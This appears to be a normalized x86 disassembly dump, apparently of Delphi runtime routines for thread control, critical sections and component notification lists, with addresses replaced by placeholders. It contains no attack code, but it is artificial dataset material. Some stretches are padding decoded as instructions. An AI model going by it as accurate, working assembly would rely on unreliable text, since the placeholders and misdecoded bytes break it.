jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bdb7
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_407df0
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
sub_43bdd0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_43be68
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43be6f
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4305a0
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test edi edi
je r-xdata
mov eax [ ebx ]
cmp edi [ eax ]
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_430438
mov eax [ ebx ]
mov edx [ r-xdata ]
call sub_4081e0
mov edx 0xc
mov eax ebx
call sub_404220
sub_43bea0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop ecx
pop ebp
retn
pause
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
sub_43bec4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xe ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_43bf12
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0xe ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SuspendThread
test eax eax
setge dl
mov eax [ ebp - 0x4 ]
call sub_43b52c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43bf34
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
mov esi eax
test esi esi
setge dl
mov eax ebx
call sub_43b52c
dec esi
jne r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xe ] 0x0
sub_43bf80
push ebx
push esi
add esp 0xffffffd8
mov esi eax
cmp [ esi + 0x3c ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
push 0xffffffff
mov eax [ esp + 0x8 ]
push eax
call WaitForSingleObject
xor ebx ebx
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x40
push 0x3e8
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x2
call MsgWaitForMultipleObjects
mov ebx eax
cmp ebx 0xffffffff
setne dl
mov eax esi
call sub_43b52c
cmp ebx 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call __imp_PeekMessageW
test ebx ebx
jne r-xdata
xor eax eax
call sub_43b054
cmp ebx 0x2
jne r-xdata
jmp r-xdata
push esp
mov eax [ esp + 0x8 ]
push eax
call GetExitCodeThread
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_43b52c
mov eax [ esp ]
add esp 0x28
pop esi
pop ebx
retn
sub_43c040
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_406bfc
xor eax eax
push ebp
push sub_43c0d1
push [ fs : eax ]
mov [ fs : eax ] esp
call IsDebuggerPresent
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c0d8
lea eax [ ebp - 0x4 ]
call sub_4068a0
retn
mov [ ebp - 0x14 ] 0x1000
mov eax [ ebp - 0x4 ]
call sub_406c0c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43c0b1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x14 ]
push eax
push 0x4
push 0x0
push 0x406d1388
call RaiseException
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_43c0e0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov [ edi + 0x4 ] 0xffffffff
mov [ edi + 0x8 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_43c14c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
movzx eax [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_43c374
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_43c198
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax esi
call sub_43c47c
mov eax esi
call sub_43c1ec
mov eax esi
call sub_43c410
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4312a0
test bl bl
jle r-xdata
mov edx esi
call sub_43c3d8
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_43c1ec
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_4305a0
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_43c22c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_430608
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4303e0
mov edx ebx
mov eax esi
call sub_43c22c
sub_43c2c0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4303e0
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebx + 0x10 ] eax
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43c9c4
sub_43c2fc
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
xor eax eax
mov [ edi + 0x4 ] eax
mov ebp [ ebx + 0x10 ]
mov esi [ ebp + 0x8 ]
test esi esi
jle r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx esi
dec edx
mov eax ebp
call sub_4305a0
cmp edi eax
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x28 ]
call sub_4055f0
xor eax eax
mov [ ebx + 0x28 ] eax
mov eax [ ebx + 0x10 ]
call sub_4055f0
xor eax eax
mov [ ebx + 0x10 ] eax
mov edx edi
xor ecx ecx
mov eax [ ebx + 0x10 ]
call sub_4307b0
mov edx esi
dec edx
mov eax [ ebx + 0x10 ]
call sub_430438
jmp r-xdata
mov edx edi
xor ecx ecx
call sub_4307b0
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
sub_43c374
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_40587c
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_43c2c0
mov dl 0x1
mov eax ebx
call sub_43cbac
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx ebx
call sub_43c3d8
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_43cb5c
sub_43c3d8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_43cbac
mov edx ebx
mov eax esi
call sub_43c2fc
pop edi
pop esi
pop ebx
retn
sub_43c410
push ebx
push esi
push edi
mov esi eax
lea eax [ esi + 0x28 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4306d0
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_43c3d8
jmp r-xdata
movzx eax [ r-xdata ]
and ax [ esi + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_43c2fc
sub_43c47c
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_4305a0
call sub_43c47c
inc edi
dec esi
jne r-xdata
sub_43c4b8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov edi [ ebx + 0x14 ]
test edi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test esi esi
jle r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx esi
dec edx
mov eax edi
call sub_4305a0
cmp ebp eax
jne r-xdata
call sub_4055f0
xor eax eax
mov [ ebx + 0x14 ] eax
mov edx ebp
xor ecx ecx
mov eax [ ebx + 0x14 ]
call sub_4307b0
mov edx esi
dec edx
mov eax [ ebx + 0x14 ]
call sub_430438
jmp r-xdata
sub_43c510
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c4b8
mov edx ebx
mov eax esi
call sub_43c4b8
pop esi
pop ebx
retn
sub_43c52c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_43c510
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4305a0
movzx ecx [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
cmp ebx [ eax + 0x8 ]
jl r-xdata
test ebx ebx
jge r-xdata
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
sub_43c58c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_43c280
push ebx
push sub_43c2a8
movzx eax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_43c294
push ebx
push sub_43c2b4
movzx eax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_43c6a4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0x8 ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test [ esi + 0x1c ] 0x10
je r-xdata
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4110d4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
push edi
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx edi
mov eax esi
call sub_43c860
test eax eax
je r-xdata
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
sub_43c860
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43c939
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov edi eax
lea eax [ ebp - 0x4 ]
mov edx edi
test edx edx
je r-xdata
call sub_409ccc
xor esi esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub edx 0xfffffff8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c940
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_43c94c
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax esi
call sub_430880
mov eax [ ebx + 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx edi
test edx edx
je r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
call sub_430ba0
sub edx 0xfffffff4
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x10 ]
call sub_4305a0
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x28 ]
call sub_43074c
inc [ ebp - 0xc ]
dec esi
jne r-xdata
sub_43c94c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x8 ] ecx
mov [ esp ] edx
xor esi esi
mov edx [ eax + 0x28 ]
mov edi [ edx + 0x8 ]
dec edi
mov eax [ edx + 0x4 ]
mov [ esp + 0x10 ] eax
cmp edi esi
jl r-xdata
mov eax [ esp + 0x8 ]
mov [ eax ] esi
xor eax eax
mov [ esp + 0xc ] eax
lea ebx [ edi + esi ]
shr ebx 0x1
mov eax [ esp + 0x10 ]
mov eax [ eax + ebx * 4 ]
mov [ esp + 0xc ] eax
mov eax [ esp + 0xc ]
mov eax [ eax + 0x8 ]
mov edx [ esp ]
call sub_410fc4
mov ebp eax
test ebp ebp
jge r-xdata
mov edi ebx
dec edi
test ebp ebp
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp edi esi
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
mov eax [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43c9c4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_43c94c
mov ecx esi
mov edx [ esp ]
mov eax [ ebx + 0x28 ]
call sub_430658
pop edx
pop esi
pop ebx
retn
sub_43c9e8
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_407768
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
xor edx edx
mov eax esi
call sub_4116bc
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x11
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
xor edx edx
mov eax ebx
call sub_43cbac
mov edx esi
mov eax ebx
call sub_43ca78
mov dl 0x1
mov eax ebx
call sub_43cbac
sub_43ca78
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4070a8
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov edx ebx
mov eax [ eax + 0x28 ]
xor ecx ecx
call sub_4307b0
mov edx ebx
mov eax [ ebx + 0x4 ]
call sub_43c9c4
sub_43cacc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4305a0
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4304dc
sub_43cb08
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_430608
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_430438
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_430658
sub_43cb5c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_43caf8
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_43cacc
mov cl 0x1
mov edx ebx
call sub_43cb5c
inc edi
dec ebp
jne r-xdata
sub_43cbac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
call sub_405ae4
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] esi
jmp r-xdata
sub_43cbd4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
sub_43cbfc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_43cc38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ccd0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov eax esi
call sub_409cb4
push eax
push r-xdata
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ccd7
lea eax [ ebp - 0xc ]
call j_sub_4068a0
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov eax ebx
call [ rw-data ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
call sub_4054c8
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
sub_43ccdd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_4058b0
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_43cd20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4056b8
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_43cd80
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_43cda4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ce05
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax esi
call sub_418a80
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ce0c
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp ebx eax
je r-xdata
mov al 0x1
sub_43ce1d
int 0x6b
dec edi
add [ ecx + 0x51 ] 0xed
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x5 ] cl
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43ceac
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_418a80
test al al
jne r-xdata
mov ebx eax
test bl bl
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ceb3
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx esi
call sub_43c510
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx esi
call sub_43c22c
jmp r-xdata
sub_43cec5
int 0x6b
dec edi
add [ ecx + 0x51 ] 0xed
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_43cf14
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
mov edx esi
call sub_43d154
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_43cf7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_43d154
mov edx ebx
mov eax esi
call sub_43d148
sub_43cfc0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43c14c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_43d004
push ebx
push esi
push edi
call sub_405bb4
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_43c198
mov eax [ edi + 0x34 ]
test eax eax
je r-xdata
cmp [ edi + 0x50 ] 0x0
je r-xdata
mov edx edi
call sub_43c510
lea eax [ edi + 0x50 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
test bl bl
jle r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_405b5c
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4306d0
mov edx eax
mov eax edi
call sub_43d154
sub_43d074
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43c52c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x34 ]
jne r-xdata
xor eax eax
mov [ edi + 0x34 ] eax
sub_43d0a0
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_43d0bc
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_43d0d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_4305a0
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_43d154
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
